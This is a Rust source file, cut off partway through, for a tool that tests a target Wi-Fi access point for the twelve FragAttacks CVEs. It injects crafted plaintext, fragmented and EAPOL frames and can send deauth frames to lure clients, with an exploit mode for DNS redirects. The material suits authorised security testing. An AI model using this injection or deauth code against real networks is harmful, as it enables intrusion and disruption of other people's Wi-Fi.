//! FragAttacks — 12 CVEs exploiting WiFi fragmentation & aggregation flaws.
//!
//! Three are **design flaws** in the 802.11 standard itself (affect ALL implementations):
//!   - CVE-2020-24588: A-MSDU injection (QoS bit 7 not authenticated)
//!   - CVE-2020-24587: Mixed key reassembly (fragments across rekey)
//!   - CVE-2020-24586: Fragment cache poisoning (cache not cleared on reconnect)
//!
//! Nine are **implementation bugs** (common across vendors):
//!   - CVE-2020-26140: Plaintext data acceptance
//!   - CVE-2020-26143: Fragmented plaintext acceptance
//!   - CVE-2020-26145: Plaintext broadcast fragments
//!   - CVE-2020-26144: EAPOL A-MSDU injection (LLC/SNAP trick)
//!   - CVE-2020-26139: EAPOL forwarding from unauthed senders
//!   - CVE-2020-26141: TKIP MIC not verified on fragments
//!   - CVE-2020-26142: Fragment processed as full frame
//!   - CVE-2020-26146: Non-consecutive PN accepted in reassembly
//!   - CVE-2020-26147: Mixed plaintext + encrypted fragment reassembly
//!
//! Test methodology: inject crafted frame(s) → monitor for ICMP echo reply or
//! DNS response that proves the target's network stack processed the injection.
//! Response = vulnerable. Timeout = not vulnerable.
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel to the target AP's channel. Each CVE test
//!   runs sequentially. Design flaw tests (3 CVEs) require MitM engine (dual
//!   adapter + CSA relay). Implementation bug tests (9 CVEs) need only injection.
//!
//! Reference: Vanhoef, "Fragment and Forge: Breaking Wi-Fi Through Frame
//! Aggregation and Fragmentation", USENIX Security 2021.
//!
//! Ported from design spec at `docs/fragattacks-design.md`.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::frame::TxFlags;
use crate::store::Ap;

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Variant — one per CVE
// ═══════════════════════════════════════════════════════════════════════════════

/// The 12 FragAttacks CVE variants.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum FragVariant {
    /// CVE-2020-24588: A-MSDU injection — QoS bit 7 not authenticated.
    /// Requires MitM position.
    AmsduInject,
    /// CVE-2020-24587: Mixed key reassembly — fragments across rekey.
    /// Requires MitM position.
    MixedKey,
    /// CVE-2020-24586: Fragment cache poisoning — cache not cleared on reconnect.
    /// Requires MitM position.
    CacheAttack,
    /// CVE-2020-26140: Plaintext data frame accepted in protected network.
    PlaintextFull,
    /// CVE-2020-26143: Fragmented plaintext accepted (unfragmented rejected).
    PlaintextFragment,
    /// CVE-2020-26145: Plaintext broadcast fragments processed as full frames.
    PlaintextBroadcast,
    /// CVE-2020-26144: EAPOL A-MSDU injection via LLC/SNAP trick.
    EapolAmsdu,
    /// CVE-2020-26139: EAPOL frames forwarded from unauthenticated senders.
    EapolForward,
    /// CVE-2020-26141: TKIP MIC not verified on fragmented frames.
    TkipMicSkip,
    /// CVE-2020-26142: Fragment processed as complete frame.
    FragAsFull,
    /// CVE-2020-26146: Non-consecutive PN accepted in reassembly.
    NonconsecPn,
    /// CVE-2020-26147: Mixed plaintext + encrypted fragments reassembled.
    MixedPlainEnc,
}

impl FragVariant {
    /// Human-readable short name for CLI display.
    pub fn label(&self) -> &'static str {
        match self {
            Self::AmsduInject => "amsdu-inject",
            Self::MixedKey => "mixed-key",
            Self::CacheAttack => "cache-attack",
            Self::PlaintextFull => "plaintext-full",
            Self::PlaintextFragment => "plaintext-frag",
            Self::PlaintextBroadcast => "plaintext-broadcast",
            Self::EapolAmsdu => "eapol-amsdu",
            Self::EapolForward => "eapol-forward",
            Self::TkipMicSkip => "tkip-mic-skip",
            Self::FragAsFull => "frag-as-full",
            Self::NonconsecPn => "nonconsec-pn",
            Self::MixedPlainEnc => "mixed-plain-enc",
        }
    }

    /// CVE identifier.
    pub fn cve(&self) -> &'static str {
        match self {
            Self::AmsduInject => "CVE-2020-24588",
            Self::MixedKey => "CVE-2020-24587",
            Self::CacheAttack => "CVE-2020-24586",
            Self::PlaintextFull => "CVE-2020-26140",
            Self::PlaintextFragment => "CVE-2020-26143",
            Self::PlaintextBroadcast => "CVE-2020-26145",
            Self::EapolAmsdu => "CVE-2020-26144",
            Self::EapolForward => "CVE-2020-26139",
            Self::TkipMicSkip => "CVE-2020-26141",
            Self::FragAsFull => "CVE-2020-26142",
            Self::NonconsecPn => "CVE-2020-26146",
            Self::MixedPlainEnc => "CVE-2020-26147",
        }
    }

    /// Description of the vulnerability.
    pub fn description(&self) -> &'static str {
        match self {
            Self::AmsduInject => "A-MSDU flag (QoS bit 7) not authenticated — outside CCMP envelope",
            Self::MixedKey => "Fragments encrypted under different keys reassembled without check",
            Self::CacheAttack => "Fragment cache not cleared on (re)connection",
            Self::PlaintextFull => "Unencrypted data frames accepted in protected network",
            Self::PlaintextFragment => "Fragmented plaintext accepted (unfragmented rejected)",
            Self::PlaintextBroadcast => "Plaintext broadcast fragments processed as full frames",
            Self::EapolAmsdu => "Plaintext A-MSDU with EAPOL header trick accepted",
            Self::EapolForward => "AP forwards EAPOL from unauthenticated senders",
            Self::TkipMicSkip => "TKIP MIC not verified on fragmented frames",
            Self::FragAsFull => "Fragmented frame processed as complete frame",
            Self::NonconsecPn => "Non-consecutive packet numbers accepted in reassembly",
            Self::MixedPlainEnc => "Mixed plaintext + encrypted fragments reassembled",
        }
    }

    /// Whether this variant requires MitM (dual adapter + CSA relay).
    pub fn requires_mitm(&self) -> bool {
        matches!(self, Self::AmsduInject | Self::MixedKey | Self::CacheAttack)
    }

    /// Whether this is a design flaw (vs implementation bug).
    pub fn is_design_flaw(&self) -> bool {
        matches!(self, Self::AmsduInject | Self::MixedKey | Self::CacheAttack)
    }

    /// Parse from string (CLI input).
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "amsdu" | "amsdu-inject" | "24588" | "cve-2020-24588" => Some(Self::AmsduInject),
            "mixed-key" | "mixed" | "24587" | "cve-2020-24587" => Some(Self::MixedKey),
            "cache" | "cache-attack" | "24586" | "cve-2020-24586" => Some(Self::CacheAttack),
            "plaintext" | "plaintext-full" | "26140" | "cve-2020-26140" => Some(Self::PlaintextFull),
            "plaintext-frag" | "plaintext-fragment" | "26143" | "cve-2020-26143" => Some(Self::PlaintextFragment),
            "broadcast" | "plaintext-broadcast" | "26145" | "cve-2020-26145" => Some(Self::PlaintextBroadcast),
            "eapol-amsdu" | "26144" | "cve-2020-26144" => Some(Self::EapolAmsdu),
            "eapol-fwd" | "eapol-forward" | "26139" | "cve-2020-26139" => Some(Self::EapolForward),
            "tkip-mic" | "tkip-mic-skip" | "26141" | "cve-2020-26141" => Some(Self::TkipMicSkip),
            "frag-full" | "frag-as-full" | "26142" | "cve-2020-26142" => Some(Self::FragAsFull),
            "noncons-pn" | "nonconsec-pn" | "26146" | "cve-2020-26146" => Some(Self::NonconsecPn),
            "mixed-enc" | "mixed-plain-enc" | "26147" | "cve-2020-26147" => Some(Self::MixedPlainEnc),
            _ => None,
        }
    }

    /// All 12 variants in CVE order.
    pub fn all() -> &'static [FragVariant] {
        &[
            Self::AmsduInject, Self::MixedKey, Self::CacheAttack,
            Self::PlaintextFull, Self::PlaintextFragment, Self::PlaintextBroadcast,
            Self::EapolAmsdu, Self::EapolForward, Self::TkipMicSkip,
            Self::FragAsFull, Self::NonconsecPn, Self::MixedPlainEnc,
        ]
    }

    /// All 9 injection-only variants (no MitM required).
    #[allow(dead_code)]
    pub fn injection_only() -> &'static [FragVariant] {
        &[
            Self::PlaintextFull, Self::PlaintextFragment, Self::PlaintextBroadcast,
            Self::EapolAmsdu, Self::EapolForward, Self::TkipMicSkip,
            Self::FragAsFull, Self::NonconsecPn, Self::MixedPlainEnc,
        ]
    }
}

/// Attack mode.
#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FragMode {
    /// Vulnerability detection only — inject test frames, monitor for response.
    Test,
    /// Active exploitation — inject payload (DNS redirect, etc.).
    Exploit,
}

impl Default for FragMode {
    fn default() -> Self {
        Self::Test
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the FragAttacks test suite.
#[allow(dead_code)]
#[derive(Clone, Debug)]
pub struct FragParams {
    // === Attack selection ===
    /// Which variant(s) to test. None = all applicable. Default: None (all).
    pub variant: Option<FragVariant>,
    /// Test or exploit mode. Default: Test.
    pub mode: FragMode,

    // === Fragment parameters ===
    /// Fragment size threshold in bytes. Default: 200.
    pub fragment_size: u16,
    /// Number of fragments to split into. Default: 2.
    pub fragment_count: u8,
    /// Delay between sending fragments. Default: 0ms.
    pub fragment_delay: Duration,
    /// PN increment for non-consecutive PN test. Default: 2.
    pub pn_increment: u8,

    // === Timing ===
    /// Per-test timeout. Default: 10s.
    pub test_timeout: Duration,
    /// How long to wait for a response after injection. Default: 5s.
    pub response_wait: Duration,
    /// Retries per test before declaring not vulnerable. Default: 3.
    pub retry_count: u8,
    /// Delay between retries. Default: 1s.
    pub retry_delay: Duration,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// RX poll timeout slice for frame reception loops. Default: 200ms.
    pub rx_poll_timeout: Duration,
    /// Overall attack timeout (0 = no limit). Default: 0.
    pub timeout: Duration,

    // === Injection payload ===
    /// Destination IP for injected ICMP ping. Default: [8,8,8,8] (Google DNS).
    pub inject_dst_ip: [u8; 4],
    /// Destination port for DNS test. Default: 53.
    pub inject_dst_port: u16,

    // === MitM (design flaw tests) ===
    /// Rogue channel for MitM. 0 = auto-select. Default: 0.
    pub rogue_channel: u8,
    /// CSA beacons to send for client lure. Default: 15.
    pub csa_beacon_count: u16,
    /// Interval between CSA beacons. Default: 100ms.
    pub csa_interval: Duration,
    /// Send deauth to lure client to rogue channel. Default: true.
    pub deauth_to_lure: bool,
    /// Number of deauth frames for lure. Default: 5.
    pub deauth_count: u8,

    // === Behavior ===
    /// Test the AP (we act as client) vs test client. Default: false (test AP).
    pub test_as_ap: bool,
    /// Skip variants that require unsupported capabilities. Default: true.
    pub skip_unsupported: bool,
    /// Include broadcast variant tests. Default: true.
    pub broadcast_tests: bool,
    /// Stop after first vulnerable finding. Default: false.
    pub stop_on_first_vuln: bool,
}

impl Default for FragParams {
    fn default() -> Self {
        Self {
            variant: None,
            mode: FragMode::Test,
            fragment_size: 200,
            fragment_count: 2,
            fragment_delay: Duration::ZERO,
            pn_increment: 2,
            test_timeout: Duration::from_secs(10),
            response_wait: Duration::from_secs(5),
            retry_count: 3,
            retry_delay: Duration::from_secs(1),
            channel_settle: Duration::from_millis(50),
            rx_poll_timeout: Duration::from_millis(200),
            timeout: Duration::ZERO,
            inject_dst_ip: [8, 8, 8, 8],
            inject_dst_port: 53,
            rogue_channel: 0,
            csa_beacon_count: 15,
            csa_interval: Duration::from_millis(100),
            deauth_to_lure: true,
            deauth_count: 5,
            test_as_ap: false,
            skip_unsupported: true,
            broadcast_tests: true,
            stop_on_first_vuln: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Phase
// ═══════════════════════════════════════════════════════════════════════════════

/// Current attack phase.
#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FragPhase {
    /// Initial state — not started.
    Idle,
    /// Locking channel to target AP.
    ChannelLock,
    /// Setting up MitM relay (design flaw tests only).
    MitmSetup,
    /// Injecting crafted frames for current variant.
    Injecting,
    /// Monitoring for response (ICMP reply, DNS, etc.).
    Monitoring,
    /// Attack completed.
    Done,
}

impl Default for FragPhase {
    fn default() -> Self {
        Self::Idle
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-variant test result
// ═══════════════════════════════════════════════════════════════════════════════

/// Verdict for a single CVE test.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FragVerdict {
    /// Not yet tested.
    Pending,
    /// Currently being tested.
    Testing,
    /// Target IS vulnerable — response received.
    Vulnerable,
    /// Target is NOT vulnerable — no response after all retries.
    NotVulnerable,
    /// Test skipped (e.g., requires MitM but no second adapter).
    Skipped,
    /// Test errored (channel lock failure, TX error, etc.).
    Error,
}

impl Default for FragVerdict {
    fn default() -> Self {
        Self::Pending
    }
}

/// Result for a single CVE test.
#[derive(Debug, Clone)]
pub struct FragTestResult {
    pub variant: FragVariant,
    pub verdict: FragVerdict,
    pub frames_sent: u64,
    pub frames_received: u64,
    /// Response time in ms (if vulnerable). 0 if not vulnerable.
    pub response_time_ms: u64,
    /// Detail message (reason for skip, error, etc.).
    pub detail: String,
    /// Number of retries attempted.
    pub retries: u8,
    /// Elapsed time for this test.
    pub elapsed: Duration,
}

impl FragTestResult {
    fn new(variant: FragVariant) -> Self {
        Self {
            variant,
            verdict: FragVerdict::Pending,
            frames_sent: 0,
            frames_received: 0,
            response_time_ms: 0,
            detail: String::new(),
            retries: 0,
            elapsed: Duration::ZERO,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Final Result — aggregate result after completion
// ═══════════════════════════════════════════════════════════════════════════════

/// Aggregate result produced when the FragAttacks test suite completes.
#[derive(Debug, Clone, Default)]
pub struct FragFinalResult {
    /// Per-variant test results.
    pub results: Vec<FragTestResult>,
    /// Number of tests that were actually run (not skipped).
    pub tests_run: u32,
    /// Number of vulnerabilities found.
    pub vulnerabilities_found: u32,
    /// Total elapsed time for the entire suite.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Real-time info snapshot for the CLI to render.
#[derive(Debug, Clone)]
pub struct FragInfo {
    // === State ===
    pub phase: FragPhase,
    pub running: bool,

    // === Target ===
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub target_rssi: i8,

    // === Progress ===
    pub current_variant: Option<FragVariant>,
    pub current_retry: u8,
    pub variant_index: u32,
    pub variant_total: u32,

    // === Counters ===
    pub frames_sent: u64,
    pub frames_received: u64,
    pub variants_tested: u32,
    pub variants_vulnerable: u32,
    pub variants_skipped: u32,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === Results ===
    pub results: Vec<FragTestResult>,
}

impl Default for FragInfo {
    fn default() -> Self {
        Self {
            phase: FragPhase::Idle,
            running: false,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
            target_rssi: -100,
            current_variant: None,
            current_retry: 0,
            variant_index: 0,
            variant_total: 0,
            frames_sent: 0,
            frames_received: 0,
            variants_tested: 0,
            variants_vulnerable: 0,
            variants_skipped: 0,
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            results: Vec::new(),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttacks Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event fired during the FragAttacks test suite.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct FragEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: FragEventKind,
}

/// What happened.
#[derive(Debug, Clone)]
pub enum FragEventKind {
    /// Test suite started against target.
    SuiteStarted {
        bssid: MacAddress,
        ssid: String,
        channel: u8,
        variant_count: u32,
    },
    /// Channel locked for testing.
    ChannelLocked { channel: u8 },
    /// Starting a specific CVE test.
    TestStarted {
        variant: FragVariant,
        index: u32,
        total: u32,
    },
    /// Injecting frames for current test.
    FramesInjected {
        variant: FragVariant,
        count: u64,
        retry: u8,
    },
    /// Monitoring for response.
    MonitoringResponse {
        variant: FragVariant,
        timeout_ms: u64,
    },
    /// Response received — target IS vulnerable!
    ResponseReceived {
        variant: FragVariant,
        response_time_ms: u64,
    },
    /// No response — retrying.
    RetryingTest {
        variant: FragVariant,
        retry: u8,
        max_retries: u8,
    },
    /// Test complete — verdict determined.
    TestComplete {
        variant: FragVariant,
        verdict: FragVerdict,
        frames_sent: u64,
        response_time_ms: u64,
        elapsed_ms: u64,
    },
    /// Test skipped (requires MitM, unsupported, etc.).
    TestSkipped {
        variant: FragVariant,
        reason: String,
    },
    /// All tests complete — suite finished.
    SuiteComplete {
        tested: u32,
        vulnerable: u32,
        skipped: u32,
        total: u32,
        elapsed: Duration,
    },
    /// Channel unlocked — scanner resumes hopping.
    ChannelUnlocked,
    /// Non-fatal error during test.
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FragAttack — the attack engine (SharedAdapter architecture)
// ═══════════════════════════════════════════════════════════════════════════════

/// FragAttacks test engine.
///
/// Uses SharedAdapter for all adapter access. Spawns its own thread via start().
/// The scanner keeps running alongside — channel contention is managed by the
/// SharedAdapter's channel lock mechanism.
pub struct FragAttack {
    params: FragParams,
    info: Arc<Mutex<FragInfo>>,
    events: Arc<EventRing<FragEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl FragAttack {
    pub fn new(params: FragParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(FragInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the FragAttacks test suite on a background thread.
    ///
    /// `target` is the AP from the scanner. All tests run against this AP.
    pub fn start(&self, shared: SharedAdapter, target: Ap) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        // Determine which variants to test
        let variants: Vec<FragVariant> = match params.variant {
            Some(v) => vec![v],
            None => FragVariant::all().to_vec(),
        };

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.phase = FragPhase::ChannelLock;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.target_rssi = target.rssi;
            info.variant_total = variants.len() as u32;
            // Pre-populate results as Pending
            info.results = variants.iter().map(|v| FragTestResult::new(*v)).collect();
        }

        thread::Builder::new()
            .name("frag".into())
            .spawn(move || {
                let reader = shared.subscribe("frag");
                run_frag_attack(&shared, &reader, &target, &variants, &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = FragPhase::Done;
                }
            })
            .expect("failed to spawn frag thread");
    }

    /// Signal the attack to stop. Non-blocking.
    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Check if the attack has finished.
    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    /// Check if the attack is currently running.
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get current info snapshot for rendering.
    pub fn info(&self) -> FragInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Drain new events since last call.
    pub fn events(&self) -> Vec<FragEvent> {
        self.events.drain()
    }

    /// Human-readable name.
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "frag"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread via start()
// ═══════════════════════════════════════════════════════════════════════════════

fn run_frag_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    variants: &[FragVariant],
    params: &FragParams,
    info: &Arc<Mutex<FragInfo>>,
    events: &Arc<EventRing<FragEvent>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let our_mac = shared.mac();

    push_event(events, start, FragEventKind::SuiteStarted {
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        variant_count: variants.len() as u32,
    });

    // Lock channel to target's channel
    if let Err(e) = shared.lock_channel(target.channel, "frag") {
        push_event(events, start, FragEventKind::Error {
            message: format!("channel lock to ch{} failed: {e}", target.channel),
        });
        // Mark all as Error
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            for r in &mut info.results {
                r.verdict = FragVerdict::Error;
                r.detail = "channel lock failed".to_string();
            }
        }
        return;
    }

    push_event(events, start, FragEventKind::ChannelLocked {
        channel: target.channel,
    });
    thread::sleep(params.channel_settle);

    let mut total_tested: u32 = 0;
    let mut total_vulnerable: u32 = 0;
    let mut total_skipped: u32 = 0;

    for (idx, variant) in variants.iter().enumerate() {
        if !running.load(Ordering::SeqCst) {
            break;
        }

        // Check overall timeout
        if params.timeout > Duration::ZERO && start.elapsed() >= params.timeout {
            break;
        }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.variant_index = idx as u32 + 1;
            info.current_variant = Some(*variant);
            info.current_retry = 0;
            info.elapsed = start.elapsed();
        }

        push_event(events, start, FragEventKind::TestStarted {
            variant: *variant,
            index: idx as u32 + 1,
            total: variants.len() as u32,
        });

        // Skip MitM-required tests if skip_unsupported is set
        // (MitM engine not yet implemented — dual adapter required)
        if variant.requires_mitm() && params.skip_unsupported {
            let reason = "requires MitM (dual adapter + CSA relay) — not yet implemented".to_string();
            push_event(events, start, FragEventKind::TestSkipped {
                variant: *variant,
                reason: reason.clone(),
            });

            total_skipped += 1;
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.variants_skipped = total_skipped;
                if let Some(r) = info.results.iter_mut().find(|r| r.variant == *variant) {
                    r.verdict = FragVerdict::Skipped;
                    r.detail = reason;
                }
            }

            push_event(events, start, FragEventKind::TestComplete {
                variant: *variant,
                verdict: FragVerdict::Skipped,
                frames_sent: 0,
                response_time_ms: 0,
                elapsed_ms: 0,
            });
            continue;
        }

        // Run the individual test
        let result = run_single_test(
            shared, reader, target, *variant, params, &our_mac,
            info, events, running, start,
        );

        match result.verdict {
            FragVerdict::Vulnerable => total_vulnerable += 1,
            FragVerdict::Skipped => total_skipped += 1,
            _ => {}
        }
        total_tested += 1;

        // Update results
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.variants_tested = total_tested;
            info.variants_vulnerable = total_vulnerable;
            info.variants_skipped = total_skipped;
            if let Some(r) = info.results.iter_mut().find(|r| r.variant == *variant) {
                *r = result.clone();
            }
        }

        push_event(events, start, FragEventKind::TestComplete {
            variant: *variant,
            verdict: result.verdict,
            frames_sent: result.frames_sent,
            response_time_ms: result.response_time_ms,
            elapsed_ms: result.elapsed.as_millis() as u64,
        });

        // Stop on first vuln if configured
        if params.stop_on_first_vuln && result.verdict == FragVerdict::Vulnerable {
            break;
        }
    }

    // Unlock channel
    shared.unlock_channel();
    push_event(events, start, FragEventKind::ChannelUnlocked);

    let elapsed = start.elapsed();
    push_event(events, start, FragEventKind::SuiteComplete {
        tested: total_tested,
        vulnerable: total_vulnerable,
        skipped: total_skipped,
        total: variants.len() as u32,
        elapsed,
    });

    // Final info update
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = elapsed;
        let secs = elapsed.as_secs_f64();
        if secs > 0.0 {
            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-variant test logic
// ═══════════════════════════════════════════════════════════════════════════════

fn run_single_test(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    variant: FragVariant,
    params: &FragParams,
    our_mac: &MacAddress,
    info: &Arc<Mutex<FragInfo>>,
    events: &Arc<EventRing<FragEvent>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
) -> FragTestResult {
    let test_start = Instant::now();
    let mut result = FragTestResult::new(variant);
    result.verdict = FragVerdict::Testing;

    // Each variant crafts specific frames and monitors for response
    for retry in 0..=params.retry_count {
        if !running.load(Ordering::SeqCst) {
            result.verdict = FragVerdict::NotVulnerable;
            result.detail = "stopped".to_string();
            result.elapsed = test_start.elapsed();
            return result;
        }

        if retry > 0 {
            push_event(events, attack_start, FragEventKind::RetryingTest {
                variant,
                retry,
                max_retries: params.retry_count,
            });
            thread::sleep(params.retry_delay);
        }

        result.retries = retry;

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.phase = FragPhase::Injecting;
            info.current_retry = retry;
        }

        // Craft and inject the test frames
        let frames_sent = inject_test_frames(
            shared, target, variant, params, our_mac,
            info, events, attack_start,
        );
        result.frames_sent += frames_sent;

        push_event(events, attack_start, FragEventKind::FramesInjected {
            variant,
            count: frames_sent,
            retry,
        });

        // Monitor for response
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.phase = FragPhase::Monitoring;
        }

        push_event(events, attack_start, FragEventKind::MonitoringResponse {
            variant,
            timeout_ms: params.response_wait.as_millis() as u64,
        });

        let monitor_start = Instant::now();
        match monitor_response(reader, target, variant, params, running, info) {
            Some(received_count) => {
                let response_time = monitor_start.elapsed();
                result.verdict = FragVerdict::Vulnerable;
                result.response_time_ms = response_time.as_millis() as u64;
                result.frames_received += received_count;
                result.detail = format!(
                    "response received in {}ms",
                    result.response_time_ms
                );

                push_event(events, attack_start, FragEventKind::ResponseReceived {
                    variant,
                    response_time_ms: result.response_time_ms,
                });

                // Update global counters
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_sent += frames_sent;
                    info.frames_received += received_count;
                }

                result.elapsed = test_start.elapsed();
                return result;
            }
            None => {
                // No response — continue retrying
                result.frames_received = 0;
            }
        }
    }

    // All retries exhausted — not vulnerable
    result.verdict = FragVerdict::NotVulnerable;
    result.detail = format!(
        "no response after {} retries ({}ms each)",
        params.retry_count + 1,
        params.response_wait.as_millis()
    );
    result.elapsed = test_start.elapsed();

    // Update global counters
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent += result.frames_sent;
    }

    result
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame injection — per-variant crafted frames
// ═══════════════════════════════════════════════════════════════════════════════

/// Inject test frames for a specific CVE variant. Returns number of frames sent.
fn inject_test_frames(
    shared: &SharedAdapter,
    target: &Ap,
    variant: FragVariant,
    params: &FragParams,
    our_mac: &MacAddress,
    info: &Arc<Mutex<FragInfo>>,
    events: &Arc<EventRing<FragEvent>>,
    attack_start: Instant,
) -> u64 {
    let mut sent: u64 = 0;
    let bssid = &target.bssid;
    let tx_opts = TxOptions {
        flags: TxFlags::NO_ACK,
        ..TxOptions::default()
    };

    match variant {
        FragVariant::PlaintextFull => {
            // CVE-2020-26140: Send plaintext data frame with ICMP ping.
            // If the target accepts and processes it, we'll get an ICMP reply.
            let frame = build_plaintext_data(our_mac, bssid, &params.inject_dst_ip);
            if shared.tx_frame(&frame, &tx_opts).is_ok() {
                sent += 1;
            }
        }

        FragVariant::PlaintextFragment => {
            // CVE-2020-26143: Send fragmented plaintext data frames.
            // Target rejects unfragmented but may accept fragmented.
            let payload = build_icmp_payload(&params.inject_dst_ip);
            let fragments = fragment_payload(our_mac, bssid, &payload, params.fragment_size);
            for frag in &fragments {
                if !is_running_check(shared, frag, &tx_opts) {
                    break;
                }
                sent += 1;
                if params.fragment_delay > Duration::ZERO {
                    thread::sleep(params.fragment_delay);
                }
            }
        }

        FragVariant::PlaintextBroadcast => {
            // CVE-2020-26145: Send plaintext broadcast fragment containing ICMP.
            let frame = build_broadcast_fragment(bssid, &params.inject_dst_ip);
            if shared.tx_frame(&frame, &tx_opts).is_ok() {
                sent += 1;
            }
        }

        FragVariant::EapolAmsdu => {
            // CVE-2020-26144: Craft frame where first 8 bytes are valid LLC/SNAP
            // + EAPOL EtherType AND valid A-MSDU subframe header.
            let frame = build_eapol_amsdu(our_mac, bssid, &params.inject_dst_ip);
            if shared.tx_frame(&frame, &tx_opts).is_ok() {
                sent += 1;
            }
        }

        FragVariant::EapolForward => {
            // CVE-2020-26139: Send EAPOL frame from unauthed MAC.
            // Check if AP forwards it to the network.
            let fake_mac = MacAddress::new([0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01]);
            let frame = build_eapol_start(&fake_mac, bssid);
            if shared.tx_frame(&frame, &tx_opts).is_ok() {
                sent += 1;
            }
        }

        FragVariant::TkipMicSkip => {
            // CVE-2020-26141: Send TKIP fragments without valid MIC.
            let payload = build_icmp_payload(&params.inject_dst_ip);
            let fragments = fragment_payload(our_mac, bssid, &payload, params.fragment_size);
            for frag in &fragments {
                if !is_running_check(shared, frag, &tx_opts) {
                    break;
                }
                sent += 1;
            }
        }

        FragVariant::FragAsFull => {
            // CVE-2020-26142: Send fragment 0 with more_frags=1 containing
            // a full ICMP ping. Do NOT send fragment 1. If target replies,
            // it processed the fragment as a complete frame.
            let frame = build_fragment_as_full(our_mac, bssid, &params.inject_dst_ip);
            if shared.tx_frame(&frame, &tx_opts).is_ok() {
                sent += 1;
            }
        }

        FragVariant::NonconsecPn => {
            // CVE-2020-26146: Send fragments with PN gap.
            // PN+0 for frag 0, PN+<pn_increment> for frag 1 (instead of PN+1).
            let payload = build_icmp_payload(&params.inject_dst_ip);
            let fragments = fragment_payload_with_pn_gap(
                our_mac, bssid, &payload, params.fragment_size, params.pn_increment,
            );
            for frag in &fragments {
                if !is_running_check(shared, frag, &tx_opts) {
                    break;
                }
                sent += 1;
                if params.fragment_delay > Duration::ZERO {
                    thread::sleep(params.fragment_delay);
                }
            }
        }

        FragVariant::MixedPlainEnc => {
            // CVE-2020-26147: Fragment 1 plaintext + fragment 2 also plaintext
            // (simulating mixed encryption state). In real exploit, frag 1 would
            // be encrypted and frag 2 plaintext, but since we don't have the PTK,
